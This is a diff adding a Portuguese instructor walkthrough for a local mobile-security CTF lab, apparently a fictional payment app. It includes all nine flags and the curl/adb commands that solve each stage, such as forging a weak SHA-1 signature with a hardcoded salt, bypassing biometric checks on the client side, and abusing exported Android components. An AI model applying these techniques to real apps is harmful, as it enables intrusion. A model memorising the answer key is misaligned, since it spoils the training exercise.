@@ -899,6 +899,463 @@ backend e exercita login/progress/submit/scoreboard.
 
 ---
 
+## 11. Fase 15 — Walkthrough manual completo (instrutor)
+
+> **Material de instrutor — contém as flags reais.** Esta seção é o guia manual,
+> passo a passo, do início ao fim da cadeia. É deliberadamente detalhada (estilo
+> "trabalho de formiga"): abra o app, faça login, vá à tela, observe a resposta,
+> copie o valor, chame o endpoint, valide a evidência, submeta a flag, avance.
+> Todo o ambiente é **local e autorizado** (`127.0.0.1:8102`). Nada aqui deve ser
+> usado contra apps ou sistemas reais.
+
+Os comandos usam `curl` + `jq` contra o backend local. Onde houver app Android, os
+passos de UI/`adb` são descritos para emulador. O fluxo de submissão é sempre o
+mesmo: obtenha a flag (checkpoint do backend ou trilha Android), e submeta em
+`POST /api/mobile/challenge/submit` com `stageId` + `flag` + `evidence`.
+
+### 15.1 Preparação do ambiente
+
+1. **Suba o backend** a partir da pasta do lab:
+   ```bash
+   cd lab-08-obsidianpay
+   docker compose up --build -d
+   ```
+2. **Confirme a porta 8102** e a saúde do serviço:
+   ```bash
+   curl -s http://127.0.0.1:8102/health
+   # => {"status":"ok","name":"ObsidianPay Mobile","expectedPort":8102}
+   ```
+   Se `expectedPort` não for `8102`, algo está errado no compose — veja
+   Troubleshooting (15.12).
+3. **Emulador vs. celular físico:**
+   - **Android Emulator:** o app fala com `http://10.0.2.2:8102` (alias do
+     emulador para o `127.0.0.1` do host). Nenhuma configuração extra.
+   - **Celular físico:** o aparelho **não** alcança `127.0.0.1` do PC. Descubra o
+     IP do PC na LAN (ex.: `192.168.0.50`), abra a tela **API Host** no app e
+     salve `http://192.168.0.50:8102`.
+4. **API Host no app:** todos os fluxos de UI assumem que a base URL aponta para o
+   backend do lab. Confirme na tela **API Host** antes de começar.
+5. **Burp (opcional):** para observar o diálogo app↔API, configure o proxy do
+   emulador/aparelho para o Burp e navegue. Não é necessário para os checkpoints
+   de backend (que podem ser exercitados direto por `curl`).
+6. **Android Studio / ADB / Frida (opcionais):** necessários apenas para as
+   trilhas com o app (Stage 03 via `adb`, e instrumentação dinâmica). Os
+   checkpoints de backend funcionam sem nenhum deles.
+
+### 15.2 Login inicial
+
+A conta pública do aluno é **`guest` / `guest123`**. Faça login e guarde o token:
+
+```bash
+TOKEN=$(curl -s -X POST http://127.0.0.1:8102/api/mobile/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"guest","password":"guest123"}' | jq -r .token)
+echo "$TOKEN"
+```
+
+> As credenciais internas (`analyst`/`operator`) existem no backend para fases de
+> descoberta, mas **não** são necessárias para a cadeia e **não** aparecem no
+> Student Guide. Todo o fluxo abaixo funciona com `guest`.
+
+Confira o progresso inicial (sem flags na resposta):
+
+```bash
+curl -s http://127.0.0.1:8102/api/mobile/challenge/progress \
+  -H "Authorization: Bearer $TOKEN" | jq '{chainId, totalStages}'
+# => { "chainId": "obsidianpay-mobile-final-chain", "totalStages": 9 }
+```
+
+---
+
+### 15.3 Stage 01 — Mobile Recon
+
+- **Objetivo:** reconhecer o contrato mobile e disparar o checkpoint de recon.
+- **Tela/onde:** `GET /api/mobile/config` (config pública do app).
+- **Header esperado:** `X-Obsidian-Recon: mobile-config-review`.
+- **Onde a flag aparece:** no bloco `reconCheckpoint.flag` da resposta de config
+  quando — e somente quando — o header de recon é enviado.
+
+Passo a passo:
+
+```bash
+# 1. observe a config sem o header (sem checkpoint)
+curl -s http://127.0.0.1:8102/api/mobile/config | jq 'has("reconCheckpoint")'
+# => false
+
+# 2. repita com o header de revisão de configuração mobile
+curl -s http://127.0.0.1:8102/api/mobile/config \
+  -H 'X-Obsidian-Recon: mobile-config-review' | jq .reconCheckpoint.flag
+# => "FLAG{obsidianpay_mobile_recon_01}"
+```
+
+- **Flag real:** `FLAG{obsidianpay_mobile_recon_01}`.
+- **Evidência esperada:** resposta de `/api/mobile/config` contendo o bloco
+  `reconCheckpoint` ao enviar o header de recon.
+
+Submeta:
+
+```bash
+curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"stageId":"stage-01-recon","flag":"FLAG{obsidianpay_mobile_recon_01}","evidence":"config + X-Obsidian-Recon header"}'
+# => { "accepted": true, "pointsAwarded": 100, "totalScore": 100, ... }
+```
+
+---
+
+### 15.4 Stage 02 — Insecure Storage
+
+- **Objetivo:** abusar do sync de suporte legado para revelar o checkpoint de
+  armazenamento local.
+- **Tela/onde:** `POST /api/mobile/support/sync` (no app: tela **Suporte** →
+  sync). O backend ecoa o que o cliente afirma sobre o cache local.
+- **Campo gatilho:** `cacheCheckpoint: "local-storage-review"` no body.
+- **Onde a resposta pode ser cacheada (app):** após o sync, o app guarda o último
+  payload localmente. Vale procurar em:
+  - `SharedPreferences` (`/data/data/com.obsidianpay.mobile/shared_prefs/`),
+  - `filesDir`/`cacheDir` (`.../files/`, `.../cache/obsidian-support-last-sync.json`),
+  - SQLite (`databases/obsidianpay_local.db`, tabela `cached_*`/`debug_events`).
+
+Passo a passo:
+
+```bash
+curl -s -X POST http://127.0.0.1:8102/api/mobile/support/sync \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"message":"storage review","cacheCheckpoint":"local-storage-review"}' \
+  | jq .localStorageCheckpoint.flag
+# => "FLAG{obsidianpay_insecure_storage_02}"
+```
+
+- **Flag real:** `FLAG{obsidianpay_insecure_storage_02}`.
+- **Evidência esperada:** resposta de `/api/mobile/support/sync` contendo
+  `localStorageCheckpoint` (e, no device, o mesmo material cacheado em claro).
+
+Submeta:
+
+```bash
+curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"stageId":"stage-02-insecure-storage","flag":"FLAG{obsidianpay_insecure_storage_02}","evidence":"support/sync cacheCheckpoint"}'
+# => { "accepted": true, "pointsAwarded": 150, ... }
+```
+
+---
+
+### 15.5 Stage 03 — Exported Components
+
+- **Objetivo:** demonstrar abuso de componentes Android **exportados** (Activity,
+  BroadcastReceiver, ContentProvider) em ambiente local autorizado.
+- **Componentes (Fase 7):**
+  - Activity exportada `InternalOpsActivity` (action `com.obsidianpay.mobile.INTERNAL_OPS`).
+  - BroadcastReceiver exportado `DebugCommandReceiver` (action `com.obsidianpay.mobile.DEBUG_COMMAND`).
+  - ContentProvider exportado `ObsidianNotesProvider` (authority `com.obsidianpay.mobile.provider.notes`).
+- **Comandos ADB (emulador local):**
+  ```bash
+  # ContentProvider exportado — caminhos de query
+  adb shell content query --uri content://com.obsidianpay.mobile.provider.notes/notes
+  adb shell content query --uri content://com.obsidianpay.mobile.provider.notes/debug
+  adb shell content query --uri content://com.obsidianpay.mobile.provider.notes/cache
+
+  # Activity exportada
+  adb shell am start -n com.obsidianpay.mobile/.platform.InternalOpsActivity \
+    -a com.obsidianpay.mobile.INTERNAL_OPS \
+    --es obsidian.intent.extra.RECEIPT_ID 1002
+
+  # BroadcastReceiver exportado
+  adb shell am broadcast -a com.obsidianpay.mobile.DEBUG_COMMAND \
+    --es command write_debug_export --es route support/ops
+  ```
+  > No build debug o `applicationId` é `com.obsidianpay.mobile.debug`; ajuste o
+  > alvo `-n`/pacote conforme o build instalado.
+- **Evidência esperada:** saída de `adb` (content query / am broadcast / am start)
+  demonstrando o componente exportado e o estado local afetado (visível na tela
+  interna **Local State**: eventos `exported_*`/`external_debug_*`).
+
+> **Importante (não inventar comportamento):** o ContentProvider **não** retorna a
+> flag — por design ele só devolve notas de suporte, estado local e um
+> `token_preview` mascarado (nunca o token inteiro nem `FLAG{`). Esta etapa é
+> validada pela **cadeia/backend** mais a **evidência do componente exportado**. A
+> flag oficial do estágio (referência de instrutor, vinda de `api/src/flags.js`) é
+> `FLAG{obsidianpay_exported_components_03}` e é a que se submete à cadeia.
+
+- **Flag real:** `FLAG{obsidianpay_exported_components_03}`.
+
+Submeta (anexando a evidência do componente exportado):
+
+```bash
+curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"stageId":"stage-03-exported-components","flag":"FLAG{obsidianpay_exported_components_03}","evidence":"adb content query provider.notes + am broadcast DEBUG_COMMAND"}'
+# => { "accepted": true, "pointsAwarded": 200, ... }
+```
+
+---
+
+### 15.6 Stage 04 — WebView Bridge
+
+- **Objetivo:** usar o modo de auditoria da bridge da WebView de suporte.
+- **Tela/onde:** **Suporte → Web Support** (portal em WebView). A WebView expõe a
+  interface JavaScript `ObsidianBridge` (via `@JavascriptInterface`).
+- **Endpoint:** `GET /api/mobile/webview/support?topic=bridge-audit&message=cache-review`.
+- **Onde observar dados:** o portal detecta `window.ObsidianBridge` e renderiza um
+  bloco `bridgeCheckpoint` no HTML do tópico de auditoria.
+
+Passo a passo:
+
+```bash
+curl -s 'http://127.0.0.1:8102/api/mobile/webview/support?topic=bridge-audit&message=cache-review' \
+  -H "Authorization: Bearer $TOKEN" | grep -o 'FLAG{obsidianpay_webview_bridge_04}'
+# => FLAG{obsidianpay_webview_bridge_04}
+```
+
+- **Flag real:** `FLAG{obsidianpay_webview_bridge_04}`.
+- **Evidência esperada:** HTML/JSON de `/api/mobile/webview/support` contendo
+  `bridgeCheckpoint` para o tópico `bridge-audit`.
+
+Submeta:
+
+```bash
+curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"stageId":"stage-04-webview-bridge","flag":"FLAG{obsidianpay_webview_bridge_04}","evidence":"webview/support topic=bridge-audit bridgeCheckpoint"}'
+# => { "accepted": true, "pointsAwarded": 200, ... }
+```
+
+---
+
+### 15.7 Stage 05 — Device Trust
+
+- **Objetivo:** forjar a assinatura legada fraca e ser aceito pelo device-trust.
+- **Conceito:** o app (`security/HardcodedSecrets.kt`, `LegacyRequestSigner.kt`)
+  monta a confiança localmente com um **salt embutido**. A assinatura é
+  `sha1(username:deviceId:timestamp:salt)` — **sem HMAC, sem nonce**, forjável
+  offline. O backend recomputa a mesma assinatura SHA-1 fraca.
+- **Headers `X-Obsidian-*`:** `X-Obsidian-Client`, `X-Obsidian-Device`,
+  `X-Obsidian-Timestamp`, `X-Obsidian-Signature`.
+- **Checkpoint:** ao aceitar a assinatura, a resposta `trusted-legacy` inclui
+  `deviceTrustCheckpoint.flag`.
+
+Passo a passo (forja via shell):
+
+```bash
+SALT='obsidian-legacy-attestation-2026'
+SIG=$(printf '%s' "guest:android-emulator-obsidian:1700000000000:$SALT" | sha1sum | cut -d' ' -f1)
+curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/device-trust \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "X-Obsidian-Client: obsidian-mobile-legacy-client" \
+  -H "X-Obsidian-Device: android-emulator-obsidian" \
+  -H "X-Obsidian-Timestamp: 1700000000000" \
+  -H "X-Obsidian-Signature: $SIG" \
+  -H 'Content-Type: application/json' \
+  -d '{"deviceId":"android-emulator-obsidian","attestationMode":"legacy"}' \
+  | jq .deviceTrustCheckpoint.flag
+# => "FLAG{obsidianpay_device_trust_05}"
+```
+
+- **Flag real:** `FLAG{obsidianpay_device_trust_05}`.
+- **Evidência esperada:** resposta `trusted-legacy` de
+  `/api/mobile/internal/device-trust` contendo `deviceTrustCheckpoint`.
+
+Submeta:
+
+```bash
+curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"stageId":"stage-05-device-trust","flag":"FLAG{obsidianpay_device_trust_05}","evidence":"forged sha1 legacy signature accepted"}'
+# => { "accepted": true, "pointsAwarded": 250, ... }
+```
+
+---
+
+### 15.8 Stage 06 — Biometric Vault
+
+- **Objetivo:** explorar a confiança client-side do vault.
+- **Conceito:** o app (`auth/LocalAuthState.kt`, `auth/BiometricGate.kt`) decide
+  **localmente** se o vault está desbloqueado e informa o servidor. O servidor
+  **não** verifica biometria de forma independente — confia em `localAuth=true`.
+- **Endpoint:** `POST /api/mobile/internal/vault-mobile/unlock`.
+- **Checkpoint:** quando `localAuth=true` com decisão coerente
+  (`vaultUnlocked`/`authDecision`), a resposta `vault-access-granted` inclui
+  `vaultCheckpoint.flag`.
+
+Passo a passo (bypass trivial via curl):
+
+```bash
+curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/vault-mobile/unlock \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"localAuth":true,"vaultUnlocked":true,"method":"bypass","authDecision":"granted"}' \
+  | jq .vaultCheckpoint.flag
+# => "FLAG{obsidianpay_biometric_vault_06}"
+```
+
+- **Flag real:** `FLAG{obsidianpay_biometric_vault_06}`.
+- **Evidência esperada:** resposta `vault-access-granted` de
+  `/api/mobile/internal/vault-mobile/unlock` contendo `vaultCheckpoint`.
+
+Submeta:
+
+```bash
+curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"stageId":"stage-06-biometric-vault","flag":"FLAG{obsidianpay_biometric_vault_06}","evidence":"localAuth=true accepted by server"}'
+# => { "accepted": true, "pointsAwarded": 250, ... }
+```
+
+---
+
+### 15.9 Stage 07 — Network/Pinning
+
+- **Objetivo:** acessar o modo de revisão de rede/pinning (report-only).
+- **Conceito:** o perfil de rede descreve a postura de pinning **report-only**, o
+  cleartext local e os hint IDs de bypass. A tela **API Host** mostra o perfil; o
+  Burp pode observar o tráfego. O pinning não é forçado (scaffold).
+- **Endpoint:** `GET /api/mobile/internal/network-profile`.
+- **Header esperado:** `X-Obsidian-Network-Review: burp-pinning-check`.
+- **Checkpoint:** com o header de revisão, a resposta inclui `networkCheckpoint.flag`.
+
+Passo a passo:
+
+```bash
+curl -s http://127.0.0.1:8102/api/mobile/internal/network-profile \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'X-Obsidian-Network-Review: burp-pinning-check' \
+  | jq .networkCheckpoint.flag
+# => "FLAG{obsidianpay_network_pinning_07}"
+```
+
+- **Flag real:** `FLAG{obsidianpay_network_pinning_07}`.
+- **Evidência esperada:** resposta de `/api/mobile/internal/network-profile`
+  contendo `networkCheckpoint`.
+
+Submeta:
+
+```bash
+curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"stageId":"stage-07-network-pinning","flag":"FLAG{obsidianpay_network_pinning_07}","evidence":"network-profile + X-Obsidian-Network-Review header"}'
+# => { "accepted": true, "pointsAwarded": 250, ... }
+```
+
+---
+
+### 15.10 Stage 08 — App Integrity
+
+- **Objetivo:** demonstrar que a integridade é client-asserted/report-only.
+- **Conceito:** o app (`integrity/NativeGate.kt`, `integrity/TamperCheck.kt`)
+  calcula um relatório de integridade **no próprio processo**. O servidor confia
+  no relatório (`integrityPolicy: report-only`) — totalmente patchável. Os
+  `bypassHintIds` (`jni-return-value-hook`, `patch-native-gate-result`) apontam os
+  pontos de hook/patch.
+- **Endpoint:** `POST /api/mobile/internal/app-integrity`.
+- **Checkpoint:** ao reportar um `bypassHintId` de NativeGate, a resposta inclui
+  `integrityCheckpoint.flag`.
+
+Passo a passo:
+
+```bash
+curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/app-integrity \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"bypassHintIds":["jni-return-value-hook"],"tamperScore":0}' \
+  | jq .integrityCheckpoint.flag
+# => "FLAG{obsidianpay_integrity_bypass_08}"
+```
+
+- **Flag real:** `FLAG{obsidianpay_integrity_bypass_08}`.
+- **Evidência esperada:** resposta de `/api/mobile/internal/app-integrity`
+  contendo `integrityCheckpoint`.
+
+Submeta:
+
+```bash
+curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"stageId":"stage-08-app-integrity","flag":"FLAG{obsidianpay_integrity_bypass_08}","evidence":"app-integrity report with NativeGate bypassHintId"}'
+# => { "accepted": true, "pointsAwarded": 300, ... }
+```
+
+---
+
+### 15.11 Stage 09 — Final Operator Chain
+
+- **Objetivo:** consolidar todas as trilhas internas e destravar a flag final.
+- **Pré-requisitos:** ter dominado device-trust (Stage 05), vault (Stage 06),
+  integridade (Stage 08) e rede (Stage 07) — as quatro provas abaixo representam
+  esse domínio.
+- **Endpoint:** `POST /api/mobile/internal/finalize-operator`.
+- **Header obrigatório:** `X-Obsidian-Device-Trust: trusted-legacy`.
+- **Body com as 4 provas** (qualquer valor truthy): `deviceTrustProof`,
+  `vaultProof`, `integrityProof`, `networkProof`.
+
+> Faltando o header **ou** qualquer prova, o endpoint responde **403** e **não**
+> vaza a flag final.
+
+Passo a passo:
+
+```bash
+curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/finalize-operator \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'X-Obsidian-Device-Trust: trusted-legacy' -H 'Content-Type: application/json' \
+  -d '{"deviceTrustProof":"sig","vaultProof":"unlock","integrityProof":"nativegate","networkProof":"pinning"}' \
+  | jq .flag
+# => "FLAG{obsidianpay_final_operator_chain_09}"
+```
+
+- **Flag final:** `FLAG{obsidianpay_final_operator_chain_09}`.
+
+Submeta a flag final (`stage-09-final-operator-chain`):
+
+```bash
+curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"stageId":"stage-09-final-operator-chain","flag":"FLAG{obsidianpay_final_operator_chain_09}","evidence":"finalize-operator with device-trust header + 4 proofs"}'
+# => { "accepted": true, "pointsAwarded": 400, "totalScore": 2000, ... }
+```
+
+Scoreboard final:
+
+```bash
+curl -s http://127.0.0.1:8102/api/mobile/challenge/scoreboard \
+  -H "Authorization: Bearer $TOKEN" \
+  | jq '{totalScore, solvedStages, totalStages, completionPercent, finalUnlocked}'
+# => { "totalScore": 2000, "solvedStages": 9, "totalStages": 9,
+#      "completionPercent": 100, "finalUnlocked": true }
+```
+
+---
+
+### 15.12 Troubleshooting
+
+| Sintoma | Causa provável | Ação |
+|---|---|---|
+| Backend não sobe | imagem antiga / build quebrado | `docker compose down` e `docker compose up --build` novamente; ler o log do container. |
+| Porta 8102 ocupada | outro processo usando a porta | `lsof -i :8102` (ou `ss -ltnp`), encerrar o processo; ou ajustar o mapeamento no compose só localmente. |
+| Android SDK ausente | sem Android Studio/SDK | os checkpoints de backend funcionam por `curl`; só Stage 03 (adb) e a instrumentação dependem do SDK. |
+| Emulador não conecta | usando `127.0.0.1` no emulador | no app, a base URL deve ser `http://10.0.2.2:8102`. |
+| Celular físico não conecta | usando `10.0.2.2`/`127.0.0.1` no aparelho | use a tela **API Host** com `http://<IP_DO_PC>:8102` (mesma LAN). |
+| API Host errado | override salvo apontando para host inválido | limpe o override na tela **API Host** e salve a URL correta. |
+| Token expirado/ausente | sem `Authorization: Bearer` ou token velho | refaça o login `guest`/`guest123` e reexporte `$TOKEN`. |
+| Submit `accepted:false` | flag errada para o `stageId` | confirme `stageId` correto e a flag exata daquele estágio (sem espaços). |
+| Submit `pointsAwarded:0` + `duplicate:true` | estágio já resolvido | comportamento idempotente esperado — não há erro. |
+| Docker não disponível | sem Docker no host | rode o backend direto com Node (`node api/src/server.js`) na porta 8102, se o Node estiver instalado. |
+
+### 15.13 Checklist final do instrutor
+
+- [ ] Backend de pé em `127.0.0.1:8102`, `/health` ok.
+- [ ] Login `guest`/`guest123` retorna token.
+- [ ] **Stage 01** — `GET /api/mobile/config` + `X-Obsidian-Recon` → flag 01, submit 100 pts.
+- [ ] **Stage 02** — `POST /api/mobile/support/sync` `cacheCheckpoint` → flag 02, submit 150 pts.
+- [ ] **Stage 03** — adb provider/receiver/activity exportados → evidência + flag 03, submit 200 pts.
+- [ ] **Stage 04** — `GET /api/mobile/webview/support?topic=bridge-audit` → flag 04, submit 200 pts.
+- [ ] **Stage 05** — `POST /api/mobile/internal/device-trust` assinatura forjada → flag 05, submit 250 pts.
+- [ ] **Stage 06** — `POST /api/mobile/internal/vault-mobile/unlock` `localAuth=true` → flag 06, submit 250 pts.
+- [ ] **Stage 07** — `GET /api/mobile/internal/network-profile` + `X-Obsidian-Network-Review` → flag 07, submit 250 pts.
+- [ ] **Stage 08** — `POST /api/mobile/internal/app-integrity` bypass hint → flag 08, submit 300 pts.
+- [ ] **Stage 09 — Final Operator Chain** — `POST /api/mobile/internal/finalize-operator` (header + 4 provas) → flag 09, submit 400 pts.
+- [ ] Evidência registrada por estágio (campo `evidence` do submit).
+- [ ] Scoreboard final: `totalScore=2000`, `solvedStages=9`, `completionPercent=100`, `finalUnlocked=true`.
+
+---
+
 ## 9. Notas de manutenção
 
 - Flags reais **não** entram em `README.md` nem `STUDENT-GUIDE.md`.
